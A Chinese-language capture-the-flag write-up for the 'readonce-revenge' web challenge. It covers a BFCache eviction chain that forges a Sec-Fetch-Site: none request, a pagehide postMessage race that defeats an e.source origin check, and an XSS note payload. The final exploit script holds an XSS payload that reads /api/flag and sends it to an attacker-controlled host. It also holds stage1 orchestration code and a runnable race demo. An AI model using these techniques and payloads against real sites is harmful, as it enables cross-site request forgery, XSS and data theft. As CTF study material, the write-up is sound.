原版 `/sandbox` **没有** CSP sandbox 指令，所以攻击者页面直接 `window.open("/sandbox?rid=...")` 时，S2 脚本运行在**真实的挑战域**上（顶级窗口没有 iframe sandbox 属性，响应头又没有 sandbox 指令）。于是原版解法（我们独立复现过端到端）是三步：

```javascript
// ① 开弹窗加载 /review，让服务器把我们的脚本地址登记进 currentReview.document
//    （见 2.1 名词表；"顶级导航"=整页打开——1.1 讲过 Lax Cookie 此时自动带上 admin 身份）
window.open("/review?u=<S2地址>&rid=" + rid);
// ② 开第二个弹窗加载 /sandbox —— S2 在挑战域上运行！
setTimeout(() => window.open("/sandbox?rid=" + rid), 1200);
// ③ S2 在挑战域上、与 /review 同源，所以能开个子弹窗读 /review 的网页源代码，
//    从中抠出 nonce 暗号；然后用「表单提交」的方式向 /complete 发 POST——
//    为什么用表单不用 fetch？因为 /sandbox 页面的 CSP 禁止它发 fetch（connect-src），
//    但表单提交是"导航"不是"请求"，CSP 管不着——这就是原版的绕法
```

revenge 用 CSP sandbox 指令把这条路焊死：**从此 /sandbox 无论在 iframe 里、弹窗里还是顶级窗口里打开，S2 都是 opaque origin**——同源读没有了、开弹窗的权利没有了（sandbox 没给 allow-popups）。这就是我们必须去攻 review.ejs 消息校验的原因。

## 第四章：先解决八个条件——BFCache 挤出链

九个条件里最"硬"的是门 3+4：请求必须带着 `Sec-Fetch-Site: none` 打到服务器。这一章讲怎么用"历史回放"造出这个请求头——这个技术我们内部给版本编了号，最终成功的是第 5 版，所以下文叫它 **v5**（前四版都失败了，失败细节见 4.4）。

### 4.1 为什么普通导航不行

先解释两个词。**stage1**：我们攻击的第一阶段页面（部署在攻击者自己服务器上的网页，负责指挥全局——开弹窗、跑挤出链；第二阶段脚本 S2 已在 1.2 认识）。**历史栈**：就是浏览器"后退按钮"记住的网页清单——这个标签页访问过的页面按先后顺序排在里面，每访问一个新页面就压到最后。机器人浏览器的历史栈长这样（我们的攻击页面是第 3 条记录）：

```text
历史栈（最新在下）：
┌──────────────────────────────────────────────┐
│ ① /reports/check?rid=xxx&state=NONCE         │ ← 机器人流程的①
│ ② /api/flag                                   │ ← 机器人流程的②
│ ③ http://evil.com/stage1?note=...&rid=xxx    │ ← 机器人流程的④（我们的页面）
└──────────────────────────────────────────────┘
```

在我们的页面上写 `location.href = "/reports/check?..."`（让页面跳转到 check）？浏览器会认为"这个请求是从 evil.com 的网页里发起的"，给它盖 `cross-site` 章，门 3 直接 403。

**唯一能产生 `none` 的导航方式：`history.go(-N)` / `history.back()`**——历史导航语义上是"用户操作后退键"，浏览器对它产生的**真实网络请求**标 `Sec-Fetch-Site: none`。

### 4.2 障碍：BFCache 会让 history.go 根本不发请求

直接 `history.go(-2)` 回到 ① 会怎样？想象浏览器说："这页我冰箱里还冻着一份呢，不用重新做"——它把缓存里冻着的旧 check 页面原样端出来。问题在于：**端出来的过程不经过网络**——服务器根本不知道有人"又来了一次"，九道门的检查在服务器端，服务器不执行，等于白退。所以必须先让缓存里没有这份冻货（下一句的"挤"）。

解法：**把 ① 从 BFCache 里挤出去**。Chrome 的 BFCache 容量有限（实测同一标签页约 6 个页面）。我们在自己的页面上连续做 8 次**自导航**（页面让浏览器跳转到"自己"——同一个文件、但网址参数不同，效果像刷新自己；每次自导航都会在历史栈压一条新记录），塞满缓存、挤掉旧记录：

```text
挤之前的历史栈：              挤之后（8 次自导航后）：
① check    ← 在缓存里         （①② 已被挤出 BFCache）
② flag                        （② 同上）
③ stage1                      ③ stage1
                              ④ stage1?ph=evict&nn=1
                              ⑤ stage1?ph=evict&nn=2
                              ...（8 个新条目）
                              ⑪ stage1?ph=evict&nn=8
```

为什么跳 8 次而不是刚好 6 次？——BFCache 容量"约 6 个"是实测值，不是官方承诺（不同 Chrome 版本可能不同）。跳 8 次留了余量：多跳的两次成本极低（每步 120 毫秒），但少跳一次就可能导致挤出不完全（v4 偶发失败的原因之一）。宁多勿少。

此时 `history.go(-10)`（回退 2 个机器人条目 + 8 个自导航条目）落到 ① 上，缓存已无此条目 → 浏览器**重新向服务器发 GET**，带着：

```http
GET /reports/check?rid=xxx&state=NONCE HTTP/1.1
Sec-Fetch-Site: none        ← 门 3 ✓
Sec-Fetch-Dest: document    ← 门 4 ✓
Cookie: sid=...（admin）     ← 顶级历史导航，Lax Cookie 携带 ✓
```

而且 URL 里的 nonce 原样重发 → 门 7 ✓（**我们始终不知道 nonce 的值**）。

### 4.3 实现细节：让脚本"活过"8 次导航

自导航会销毁当前页面 JS，怎么让逻辑延续 8 步？——**用网址参数记录进度**（原理：每次跳转页面脚本都会死掉重启，但网址会保留——把"进行到第几步"写进网址，每次重启后读网址就知道接着干什么），每次导航到同一个页面的不同 query：

```javascript
// stage1 页面的脚本（第 nn 次加载时执行）
const params = new URLSearchParams(location.search);
const nn = parseInt(params.get("nn") || "0");

if (params.get("ph") === "evict") {
  if (nn < 8) {
    setTimeout(() => {
      location.href = location.pathname + "?ph=evict&nn=" + (nn + 1);  // 下一步
    }, 120);  // 间隔 120ms，8 步共约 1 秒
  } else {
    setTimeout(() => history.go(-10), 200);  // 挤完，回放 check
  }
} else {
  // 首次加载：先做别的准备工作（第六章的 popup），再进入挤出阶段
  setTimeout(() => { location.href = location.pathname + "?ph=evict&nn=1"; }, 3500);
}
```

这段代码逐行解释：

- `params.get("nn")`：从网址里读出"现在进行到第几步"（第一次来没有 nn 参数，当作 0）。
- `if (params.get("ph") === "evict")`：网址里有"挤出阶段"标记吗？——没有就是**首次加载**（还没开始挤出），走 else 分支：等 3.5 秒（先把第六章的弹窗攻击跑完），然后跳转到自己并带上 `?ph=evict&nn=1`（宣布进入挤出阶段、第 1 步）。
- 有标记且 nn<8：等 120 毫秒，跳转到自己、步数加一。每次跳转，脚本随页面死掉、再随新页面重启，重启后从网址读到新步数——接力棒就这样一棒棒传下去。
- nn 到 8：挤完了，等 200 毫秒，`history.go(-10)`——往回退 10 格（8 步自导航 + flag 页 + check 页），正好落回机器人访问过的 check 页面。

每一步都是同一个 stage1 页面重新加载，靠 `?nn=` 参数知道自己进行到第几步——像接力棒一样把状态跑完 8 棒。

### 4.4 失败的前四版（浓缩）

| 版本 | 思路 | 结果 |
|------|------|------|
| v1 | 不挤出、直接 `history.go(-2)` 回退到 check | 失败：check 页还在 BFCache 里（4.2 讲的缓存），浏览器直接解冻旧页面——服务器根本收不到第二次请求 |
| v2 | 用 `#hash` 变化填历史（改网址 # 号后面的部分） | 失败：只改 # 后面时页面根本不重新加载，也不会在 BFCache 里生成新存档——白改，挤不动 |
| v3 | 在弹窗（新开的小窗口）里跑挤出链 | 失败：弹窗是全新窗口，它的历史栈是空的——机器人访问 check 的记录只在主窗口的历史里，弹窗里没有东西可回放 |
| v4 | 主标签页普通跳转 8 次 + history.go 回放 | **已达成 8/9**（服务端日志确认 policy=true）。并非失败，只是时序偶有抖动（跳转间隔不定、步数硬编码） |

v5 = v4 的工程化版本：用网址参数固定步数、用固定间隔消除抖动。两者原理完全相同，下文统称 v5。 |

**v5 效果（本地复刻 + 服务器 debug 日志实证）**：

这是我们加的调试输出（7.1 第 2 步讲过怎么加）在本地跑出的真实一行——check 被第二次访问时服务器打印的全部字段状态：

```text
[check-debug] 2nd-visit note=true policy=true stateOK=true prepared=true approved=false used=false
```

逐字段翻译：note=true（笔记存在，门2 过）；**policy=true（请求真的带着 Sec-Fetch-Site: none 头——挤出链让"用户直接操作"的标记条件真正成立，门3+4 过）**；stateOK=true（网址里的暗号与服务器记录一致，门7 过——注意我们从头到尾不知道暗号是多少，是浏览器原样重发的功劳）；prepared=true（门8 过）；**approved=false（门没过——九缺一！）**；used=false（门9 过）。

结论：v5 挤出链独立完成了 8/9，唯一剩下的洞就是 approved——整个第五章将围绕它展开。

## 第五章：最后一环 approved 的死亡迷宫——140 次失败的完整记录

v5 链打通后剩下唯一的洞：**approved**。它只能由 review.ejs 里那个消息监听器 POST /complete 来设置，而监听器的放行条件是：

```javascript
if (!closing || e.source === viewer.contentWindow) return;
```

即需要一个 **e.source ≠ viewer.contentWindow** 的消息在 closing=true 之后到达。我们围绕"谁能给 review 发消息"和"能不能绕过它直接 POST"做了 140+ 个实验，全部阵亡。这一章按方向分组记录死因——请务必读完 5.7，它解释了我们为什么会**在正确答案门口得出"死锁"的错误结论**。

### 5.1 方向 A：弹窗几何学（约 30 次实验）

直觉方案：攻击者页面先用 `w = window.open("/review?...")` 弹出审查页，再用 `w.postMessage(...)` 给它发消息——审查页收到的 e.source 是攻击者窗口 ≠ viewer，防线放行，approved 到手！

**死亡原因：COOP。** 逐环拆解这个死亡：review 的响应带着 `COOP: same-origin` 头（1.3 讲过）→ 攻击者页面（evil.com）与挑战域不同源 → 弹窗一加载 review，浏览器就把弹窗踢进隔离小组、折断攻击者手里的遥控器（`w` 变成死引用）。实测最阴险的地方在于：`w.postMessage(...)` 这行代码**不报任何错**——调用看起来成功了，但信被静默丢弃，没有任何回执告诉你"没送到"。如果不专门设计实验去验证"对方到底收到没有"，你会以为消息发到了、然后去排查完全不存在的接收端问题——我们在错误的方向上又多耗了几个小时，就是被这个静默行为骗的。

我们穷举的变体全部同死因：

五次变体尝试，死因全部一样（都是 COOP 折断遥控器——但每次失败后我们都以为"是这种写法不对，换一种开法试试"，没有意识到死因是机制级的），只是断的方式不同：

- **变体 1：先开弹窗装 review，再让主标签页自己导航到 review。** 原本指望"两个窗口都装 review 总能互通"——但主标签页一加载 review（带 same-origin 档 COOP），浏览器把它和弹窗互相踢开：两个都活着，互相失联。
- **变体 2：让弹窗先加载攻击者页、再导航到 review。** 导航到 review 的那一瞬间，COOP 检查启动——弹窗和它的开窗人（攻击者主页面）当场失联，遥控器变废铁。
- **变体 3：开两个弹窗，一个装 review、一个装攻击者页。** 希望两个弹窗之间通信——但 review 弹窗已被 COOP 踢进隔离小组，攻击者弹窗在另一组，互相看不见。
- **变体 4：命名导航**（给窗口起名，之后 `window.open(url, 名字)` 按名字找到已开的窗口往里跳）。浏览器按名字找窗口时只在"自己小组"里找——review 窗口已被踢进别的小组，永远找不到，只能新开一个。
- **变体 5：表单的 `target=` 指向弹窗**（让表单提交的结果显示在弹窗里）。浏览器对它执行与 window.open 完全相同的 COOP 规则——同死。

### 5.2 方向 B：在 viewer 里再造一个窗口（约 25 次）

回顾防线的核心要求：寄件人必须**不是** viewer 自己（寄件人身份 ≠ viewer 里当前窗口的身份）。那么想法很自然：让住在 viewer 里的 S2 再造一个"孙子辈"的小窗（子 iframe），让这个小窗去发信——收信员看到的寄件人就是子窗口，子窗口 ≠ viewer 窗口，检查通过！看起来完美——

**死亡原因：三道锁同时锁死，一道都绕不过。**

第一道锁（不许造）：/sandbox 页面的 CSP 写了 `default-src 'none'`——意思是"这个页面里**任何**新开的嵌入框都不许加载任何地址"。我们试了 http://、data:、blob:、javascript: 各种地址全被浏览器拦下（控制台报 Framing violation）——子窗口第一步就造不出来。

第二道锁（不许写）：就算想不用地址、直接把内容"写"进子窗口（srcdoc / innerHTML / document.write 这些"把字符串当网页代码塞进去"的写法），又被 Trusted Types 拦下（一种新安全机制，专门禁止把字符串直接当网页代码塞进页面）。

第三道锁（不许碰）：就算前两道都侥幸过了、子窗口造出来了——它继承了 sandbox（1.2 讲过"孩子也是无国籍"），我们和它不同源，连碰都碰不到（contentDocument 读出来是 null）。

### 5.3 方向 C：e.source=null 技巧（安全社区的已知玩法）

前置知识：这是著名安全研究员 terjanq 在 SekaiCTF 2022 一道题（obligatory-calc）里公开过的技巧——**发送方 iframe 发完消息后，立刻把它自己从页面里删掉（remove），接收方处理这条消息时发现寄件人已死，`e.source` 就变成了 `null`**——null ≠ viewer.contentWindow，防线照样被骗过。

听起来很美——但这个技巧有个隐蔽的前提，正是它杀死了这条路。

**死亡原因：删 iframe 的权限在对方手里。** 这个技巧的删除动作必须发生在**接收消息的那个页面**的 DOM 里（iframe 挂在人家页面上，只有人家的代码能删它）——而 review 页面的脚本是出题人预先写死的（就是 1.2 解释过的那种"固定 JS"——存在服务器模板里、我们一个字都改不了），里面没有任何删 iframe 的代码，我们也无法注入。发送方自杀（S2 自导航）不行——实测消息会随源文档销毁而被 Chrome **直接取消投递**，连 null 都不给。

### 5.4 方向 D：绕过消息、直接 POST /complete（约 20 次）

**第一条路：用侧信道猜 nonce。**（"侧信道"= 不直接偷答案，而是观察与答案相关的旁枝信息——比如服务器响应的快慢、返回内容的长短——来一点点猜。）但 nonce 是 128 位纯随机数：长度固定（长短无差异）、与任何操作耗时无关（快慢无差异）——没有任何旁枝信息可以观察。死。

**第二条路：跳过消息、直接从攻击者页面发 POST /complete。** 本来会被 Cookie 规则拦住（跨站 POST 不带 admin 身份）——但 1.1 讲过 Chrome 有个 2 分钟宽限期，我们实测确认它对显式声明的 Lax 也生效：机器人会话 Cookie 刚建立几秒，此刻从攻击者页面跨站 POST 确实带上了 admin（服务器日志亲眼看到 admin=true）！眼看要成——**但 POST 的内容里必须附带 nonce 才会被受理，而 nonce 我们不知道**（这正是攻击它的原因）……绕了一圈回到原点。死。

### 5.5 方向 E：服务器端（约 10 次）

方向 E 是"回到服务器本身找缝"。这是穷途末路时的标准动作——前端所有路都堵死了，回头看看服务器有没有纯后端的漏洞。我们逐一排查了三条：

- **竞态漏洞**：Express（Node.js 的 Web 框架）一次只处理一个请求，检查代码一步到位——不存在"两个请求同时挤进检查缝隙"的可能（JavaScript 单线程模型保证了这一点）。我们本地专门做过并发攻击实验验证：结论是服务器端无窗口。
- **网址编码差异攻击**：构造"服务器和浏览器对同一个网址有不同理解"的输入（比如奇怪的百分号编码）——但 Node 和 Chrome 用同一套网址解析标准（WHATWG URL），理解完全一致，无缝可钻。
- **第三方库已知漏洞**：检查题目用到的所有第三方库的版本号——与原版完全相同，没有任何已知漏洞编号（CVE）可以在这些版本上利用。

全部死路——服务器是干净的，必须回到浏览器侧决斗。

### 5.6 迷宫中的三个真发现（虽未破题，但为知识库新增了实测数据）

**发现一：无国籍页面（opaque）能豁免 COOP。** 加载"被 CSP 沙箱没收身份证"页面的弹窗，居然**不会**与开窗人断开——双向通道存活（我们对这个"居然"做了双向验证：从弹窗往 opener 发消息、从 opener 往弹窗发消息，都能到达）。但反过来不行：主标签页加载带 COOP 的页面时，同小组里的无国籍成员仍被视为不兼容而被隔离。这个不对称行为说明 COOP 的检查规则对"opaque 文档的弹窗"有豁免条款（推测与 COOP 只比较"有意义的身份"有关——无国籍没有可比的域），但豁免只在一个方向上成立。本题最终没用上它，但记录在案以备将来遇到"需要弹窗但 COOP 挡路"的题。

**发现二：COOP 的分离是永久的。** 一旦断开，无论之后怎么操作都不恢复——没有任何"重连"机制。实验设计（这个设计让结论非常确凿）：被断开的弹窗里跑着一个"每 300 毫秒自增 1"的计数器脚本；主页面重新加载后再用同名的 `window.open` 打开（浏览器按名字找到已开窗口的话会复用，这是判断"旧窗口是否复活"的黄金标准）——新弹窗里的计数器**从 1 重新开始数**。这证明同名打开创建的是全新窗口，旧窗口从头到尾没有"复生"。对攻击者的含义：一旦 COOP 断了通道，不要浪费任何时间在"怎么重连"上——死了这条心，找别的通道。

**发现三：COOP 会清空 window.name。** window.name 是窗口的名字标签（可用来按名字定位窗口）。实测发现：页面被 COOP 隔离后，它的名字标签会被浏览器清空——想靠名字找回窗口的路也断了。

### 5.7 最关键的失败：我们如何在正确答案门口误判"死锁"

第六章的正确解法是"在 pagehide 时刻发消息"。而我们做过一个**专门测试这个方向**的实验（t_winid.js）却得出了相反结论，错误推理链如下：

```text
实验：S2 用 setInterval(1ms) 高频发消息，给 end 响应加 300ms 延迟制造切换窗口
观察：所有消息 eq=true（e.source === viewer.contentWindow 成立）
推理：viewer.contentWindow 返回的窗口引用（学名叫 WindowProxy）在 iframe 换文档前后是同一个对象——这是浏览器规范写明的，我们的实验也证实了
结论：viewer 里发的消息【任何时候】都被过滤 ✗ ← 错误外推！
     "任何时候"四个字没有被实验支撑——实验只覆盖了
     "旧文档存活期间发送并处理"这一种时序
```

我们漏掉了一整类没测过的时机：**消息在旧文档濒死时寄出、在新文档就位后才被处理**（时序上的"另一种可能"，我们的实验设计里根本不存在这一格）。所有 setInterval 消息都在旧文档存活期内就被处理完了，没有一条真正"活过"文档切换点。130+ 个实验的高度一致性，源于它们共享同一个时序盲区——这只是表象，背后还有三层更深的病根，以及五项可落地的根治工具（第九章完整展开）。

## 第六章：pagehide 竞态——这道题的灵魂，彻底讲清楚

前面五章的铺垫全部为了这一章。先把要攻克的代码再贴一次：

```javascript
// review.ejs 的消息监听器（题目作者写的防线）
window.addEventListener("message", (e) => {
  if (!closing || e.source === viewer.contentWindow) return;
  fetch("/complete", { body: JSON.stringify(report) });  // ← 过了就置 approved
});
```

要骗过它，必须让 `e.source === viewer.contentWindow` 为 **false**。而发消息的只能是我们控制的 S2——它就住在 viewer 里面。**自己发的消息，怎么会"不是自己"呢？**

### 6.1 先看懂：`===` 两边根本不是同一时刻取的值

防线代码再贴一次，这次盯着那行 `if` 看三秒，然后回答一个问题：`e.source` 和 `viewer.contentWindow`——这两个值是**同一瞬间**取到的吗？

```text
e.source             → 邮件上的寄件人地址：在【发件那一刻】写死在信封上，
                       之后无论发生什么都不会改
viewer.contentWindow → 前台手里实时更新的"自己人名单"：每次处理信件时
                       【现场重新读取】iframe 当前的 window 是谁
```

只要"发件时刻"和"处理时刻"之间，**viewer 里的文档换了一个**，这两个值就会指向不同的 window 对象——比较结果从 `true` 翻转成 `false`。

而 review.ejs 自己就提供了一个"换文档"的动作！看它的 load 监听器：

```javascript
viewer.addEventListener("load", () => {
  if (closing) return;
  closing = true;                       // ① 解锁（此后消息才会被处理）
  viewer.src = "/sandbox?rid=...&end";  // ② 把 viewer 的内容换成空白 end 文档
});                                     //    ← 这次导航会销毁旧文档（S2 所在的），
                                        //      装载新文档
```

所以天然存在一次"文档切换"。问题只剩一个：**怎么让 S2 的消息恰好"跨越"这次切换——在旧文档里发出、在新文档就位后才被处理？**

### 6.2 类比：拆迁前最后一封信

在进入严格的时序分析之前，先用一个生活化的类比把整个攻击"演"一遍。为什么先讲类比：接下来要同时跟踪"寄件人、收信员、换页、排队"四条线，直接上技术描述容易在脑子里打架——类比提供一个统一的场景，后面的时序图、求值表、实验代码都只是这个场景在不同精度下的重述。读完类比后 6.3 的时序图会一眼看懂，6.5 的实验输出会一眼看懂，9.3 工具一也是这个场景的表格化：

> 收发室（review）的规矩：只受理"不是本公司大楼"寄来的信。
> 我们的信使（S2）恰好就在本公司大楼（viewer 里的旧文档）上班——平时寄信，信封寄件地址是大楼地址，前台一看名单："自己人，退回。"
>
> 有一天大楼要拆迁（viewer.src = end 触发旧文档销毁）。**拆迁公告贴出的瞬间（pagehide 事件）**，信使把三封信投进邮筒——他人随旧楼一起消失了，但信已入筒。
>
> 前台处理这几封信时，"自己人名单"已经更新成**新大楼**（end 文档）的地址。核对寄件地址（旧楼）≠ 名单（新楼）——"外单位来函，受理！"→ POST /complete → approved。

类比和代码的对应关系（防止比晕）：

| 类比里的东西 | 代码里的东西 |
|---|---|
| 收发室/前台 | review 页面的 message 收信员（2.4 那段） |
| "自己人名单" | `viewer.contentWindow`（每次处理信时现场重查） |
| 信封寄件地址 | `e.source`（寄出那一刻写死） |
| 本公司大楼 | viewer iframe 里的旧文档（S2 所在） |
| 拆迁 | `viewer.src = end` 引发的文档替换 |
| 拆迁公告 | pagehide 事件（旧文档销毁前最后的通知） |

### 6.3 时序图：为什么 setInterval 失败、pagehide 成功

看图之前必须先懂一个机制——它是整个竞态的土壤：**消息不是"寄到就立刻被读"，而是先排队**。用银行打比方：你到银行（review 页面）办业务，不是一到柜台就办——先从取号机拿号（postMessage），然后坐在大厅等叫号（任务队列排队）；柜员（浏览器的事件处理）按号顺序办事，手里有别的业务（渲染、别的脚本、加载新文档）就先忙完才轮到你。**关键含义：从"拿号"到"叫到你"之间存在一段时间差——竞态就藏在这段时间里**。如果叫到你的时候你手里的排号单上写的是旧地址（旧窗口），而柜员手里的"当日会员名单"已经换成了新地址（新窗口）——对不上，你就被当成外人（这正是攻击要的）。

```text
━━━━━━ 方式一：setInterval 高频发（我们 140 次实验的做法）━━━━━━

  旧文档(S2)存活期间
  ├─ t1: postMessage → 入队 → 立刻处理
  │        e.source=【当前window】 contentWindow=【当前window】 → 相等 → 被过滤
  ├─ t2: postMessage → 同上 → 被过滤
  ├─ t3: viewer.src=end 触发……
  ▼
  文档切换（旧文档销毁，end 文档装载）
  ▼
  新文档期间：S2 已经死了，再也没有消息发出
  → 所有消息都在"旧文档存活期"内处理完毕，一次都没能跨过切换点
  → 结论"永远相等"（错误但实验上无法区分）

━━━━━━ 方式二：pagehide 时刻发（正确解法）━━━━━━

  ├─ viewer 加载完成 → closing=true → viewer.src=end 被赋值
  ▼
  浏览器开始切换文档：
  ├─ 旧文档收到 pagehide 事件（它还活着，但马上要死）
  │    └─ S2 的 pagehide 监听器触发：
  │         top.postMessage(...)  ← 此刻发出！e.source 固化为【旧文档的 window】
  │         （消息进入 review 的任务队列排队）
  ├─ 旧文档销毁
  ├─ end 文档装载完成
  ▼
  review 的事件循环处理排队消息：
       e.source=【旧文档 window（发件时的快照）】
       viewer.contentWindow=【end 文档 window（现场读取）】
       → 两个不同的对象 → === 为 false → 不相等 → 不 return → fetch 放行！✅
```

**pagehide 是 JS 里唯一能在"文档确定要死、但还没死"这个缝隙里执行代码的机制**（这类"时机到了浏览器会自动调用你预先登记的函数"的机制俗称"钩子"/hook——你提前登记，浏览器到点叫你）。为什么必须是它、别的同类机制为什么不行：

- **unload**（老一代同用途钩子）——已被 Chrome 废弃，写了也不执行。
- **beforeunload**——会弹出"确定离开吗？"对话框等用户点击；机器人是无界面浏览器（headless，没有屏幕），这个弹框根本没人能点，页面就卡死在那里，不可靠。
- **pagehide**——静默（不弹框）、可靠（一定执行）、而且**执行时机恰好落在"消息寄出后排队中、新文档还没就位"的窗口内**——寄出的信必然跨越文档切换。三个性质缺一不可，只有它全占。

### 6.4 完整的 S2 payload——只有两行

写在攻击者服务器上的 s2.js（被 /sandbox 页面当作带令牌的脚本加载——见 2.4 开头的"正门"解释；它在被没收身份证的沙箱里执行，但这无所谓，发消息不需要身份证）：

```javascript
addEventListener("pagehide", function () {   // 登记：拆迁公告贴出时叫我
  top.postMessage({ p: 1 }, "*");   // 给顶楼（review）寄第一封信
  top.postMessage({ p: 2 }, "*");   // 再寄一封——多寄几条，防竞态偶尔漏一条
});
```

三个细节：`top` = 整个窗口体系的最高层，从 S2（沙箱里）看出去，top 正是 review 页面；`addEventListener("pagehide", ...)` = 提前登记"我的页面要被销毁时，执行这段代码"；两封信都进入排队伍，等新文档就位后 review 才处理——寄件地址（e.source）已固化为旧文档。

它不需要知道 nonce、不需要任何权限、甚至不需要关心 closing——时序天然对得上：pagehide 是"viewer 加载完成、开始换页"这一刻的通知，而 closing=true 恰好也是在 viewer 加载完成时设置的——所以 pagehide 触发时 closing 必然已经是 true（两件事由同一个 load 事件引发，pagehide 在后）。S2 只需要做一件事："在拆迁公告上签字的那一瞬间寄信"。

### 6.5 机制验证实验（完整代码，可独立复现）

不依赖挑战本身——用一个 60 行的最小环境把"防线 + sandbox + pagehide"逐字复刻出来。**你只需要 Node.js 和 puppeteer 就能亲手复现这个竞态**（代码里用变量 `eq` 记录"e.source 与 contentWindow 是否相等"——pagehide 版会看到 eq 从 true 翻转成 false、防线随之放行）。

保存为 `pagehide_race_demo.js`。整个脚本的原理：在自己电脑上同时扮演"题目服务器"和"访问者"——服务器一次只服务一个页面（`/host` 是模仿 review 的防线页、`/sbx` 是模仿 /sandbox 的载荷页），访问者用无界面浏览器打开 /host、把页面里 console.log 的内容转印到终端给你看。代码分三段读：

```javascript
      <script>
        const viewer = document.getElementById("viewer");
        let closing = false;
        addEventListener("message", (e) => {
          // ★ 防线本体：与 review.ejs 完全相同的比较（eq=true 表示"寄件人是自家人"→拦截）

                      " data=" + JSON.stringify(e.data));

        });
        viewer.addEventListener("load", () => {

        });

  if (u.pathname === "/sbx") {
    // 空白 end 文档：故意延迟 300 毫秒再响应——把"切换窗口"拉长到肉眼可见
    if (u.searchParams.has("end")) {
      setTimeout(() => {
        res.writeHead(200, { "Content-Type": "text/html", "Content-Security-Policy": CSP });
        res.end("<!doctype html>");
      }, 300);
      return;
    }
    // 正常文档：装着 S2 载荷（带令牌 tn 所以 CSP 放行）
    res.writeHead(200, { "Content-Type": "text/html", "Content-Security-Policy": CSP });
    res.end(`<!doctype html><body><script nonce="tn">
      console.log("[S2] alive, origin=" + window.origin);   // 会打印 null（被没收身份证）
      // ★ 想看"失败版"：把下面整段换成 setInterval 对照（见代码块之后的说明）
      addEventListener("pagehide", function () {
        console.log("[S2] pagehide! sending top.postMessage NOW");
        top.postMessage({ pagehideMsg: 1 }, "*");
        top.postMessage({ pagehideMsg: 2 }, "*");
      });
    </scr` + `ipt></body>`);
    return;
  }
  res.writeHead(404); res.end();

// ── 第二段：扮演"访问者"并启动整台戏 ─────────────────────
}).listen(PORT, async () => {
  const browser = await puppeteer.launch({ headless: "new", args: ["--no-sandbox"] });
  const p = await browser.newPage();
  p.on("console", (m) => console.log("[chrome]", m.text()));  // 页面里的打印转印到终端
  await p.goto(`http://localhost:${PORT}/host`, { waitUntil: "domcontentloaded" });  // 打开防线页
  await sleep(4000);   // 等 4 秒：页面加载 → viewer 加载 → S2 运行 → 文档切换 → 消息排队被拆
  await browser.close(); process.exit(0);
});
// 之后看终端输出即可（预期输出见下）
```

**pagehide 版（上面代码原样）的预期输出，逐行解读：**

```text
[chrome] [S2] alive, origin=null
```
S2 在沙箱里跑起来了，`origin=null` 证明它的身份证确实被没收（1.2 第四步说的事实，亲眼验证）。

```text
[chrome] [S2] pagehide! sending top.postMessage NOW
```
viewer 加载完成、review 开始把 viewer 换成空白页——换页前的最后一瞬，S2 登记的"临死回调"被触发，两封信在这一刻投进邮筒。

```text
[chrome] MSG: closing=true eq=false data={"pagehideMsg":1}
[chrome] !!!!!! PASSED FILTER !!!!!! → 真题里此处即发 POST /complete
```
**核心两行**。第一行：review 的收信员终于拆信了——`closing=true`（开关已开，因为 viewer 加载过了）；`eq=false`（寄件人地址 ≠ 现在的自家人名单——因为寄件地址是**换页前的旧窗口**、名单是**换页后的新窗口**）。第二行：两道检查全过，防线放行——在真题里，这一刻 review 就会替我们发出 POST /complete。

```text
[chrome] MSG: closing=true eq=false data={"pagehideMsg":1}
```
（pagehideMsg:2 那条也同样通过——发两封信就是为了防偶尔漏一条。）

**对照实验（把 5.7 的盲区亲手复现一遍）**：把 S2 里 pagehide 那段换成——

```javascript
setInterval(function () { top.postMessage({ intervalMsg: 1 }, "*"); }, 1);
```

重跑，你会看到**所有**消息都是 `eq=true`、没有一条 PASSED。为什么？逐层拆开：interval 是"页面活着时"发的——寄出后立刻被拆（排队时间近乎零，期间什么也没发生）；寄件地址和名单每次都指向同一个窗口（没换页），`eq` 永远等于 true。**对照 pagehide 版**（寄出后拖到换页后才拆——地址是旧窗口、名单是新窗口，`eq=false`）——两个版本的唯一差异是"寄出与被拆之间有没有发生换页"。

而这正是我们 140 个实验得出错误结论的原因：**全部实验都在"活着时发"这一种时序里打转，没有一条消息真正跨越过换页点**。两版各跑一遍、输出放在一起看，6.1 的"求值时机"理论就亲眼看见了——这不是比喻，是字面意义上的"看见"：两行 eq=false 的输出就打在终端上。

```text
stage1 页面在机器人浏览器里运行（它从网址里拿到了报告编号 rid）

 └─ 右路（等 3.5 秒后执行，让左路先跑完）：stage1 进入 v5 挤出链（第四章）

           → 九条件全过 → 服务器渲染 review-document（把我们的笔记当网页）
```

### 7.2 完整 Exploit（实测通过版，含注释）

```javascript
// solve_revenge_final.js —— readonce-revenge 完整链
// 三件套：stage1(编排) + s2p.js(pagehide 竞态) + XSS 笔记(外传)
const http   = require("node:http");
const puppeteer = require("puppeteer");
const CHAL = "http://localhost:3000";              // 挑战实例
const PORT = 9975;                                  // 攻击者服务器端口
const EXFIL = `//host.docker.internal:${PORT}/f?`;
// 外传地址。host.docker.internal 是 Docker 的特殊域名——挑战跑在容器里，
// 容器内用它就能访问宿主机（我们的攻击者服务器跑在宿主机上）

// ── payload 1：S2（第六章的全部）──────────────────────────────
const S2 = `addEventListener("pagehide", function(){
  try { top.postMessage({p:1},"*"); top.postMessage({p:2},"*"); } catch(e){}
});`;

// ── payload 2：XSS 笔记内容（≤128 字节，读 /api/flag 并外传）──
// 原理（对不太懂 XSS 的读者，逐步拆解）：
// <img src=q> —— src 是 "q"，不是有效图片地址 → 加载必然失败
// onerror=... —— 图片加载失败时浏览器自动执行等号里的 JS（这是 XSS 的经典载体之一）
// fetch("/api/flag") —— 此刻我们已经在挑战域的页面里（XSS 生效了），带 admin 身份（3.1 的推论：必须同源才能读）
// .then(r=>r.text()) —— 等拿到响应、转成文本（flag 的 JSON 字符串）
// location="攻击者网址"+flag —— 让整个页面跳转到我们服务器，flag 拼在网址参数里 → 收信箱打印
const XSS_NOTE =
  `<img src=q onerror='fetch("/api/flag").then(r=>r.text())` +
  `.then(t=>location="${EXFIL}"+t)'>`;

// ── payload 3：stage1（弹窗 + 挤出链，第四章+第六章的编排）────
const STAGE1 = `<!doctype html><body><script>
  var rid  = new URLSearchParams(location.search).get("rid");
  var note = new URLSearchParams(location.search).get("note");
  // ① 开弹窗加载 review —— 顶级导航（=整页打开，1.1 的 Lax 规则：自动携带 admin Cookie）
  window.open("${CHAL}/review?u=${encodeURIComponent(`http://host.docker.internal:${PORT}/s2p.js`)}&rid="+rid+"&note="+note, "REV");
  // ② v5 挤出链：URL 参数当程序计数器，8 步自导航挤掉 BFCache 里的 check
  var ph = new URLSearchParams(location.search).get("ph");
  var nn = parseInt(new URLSearchParams(location.search).get("nn")||"0");
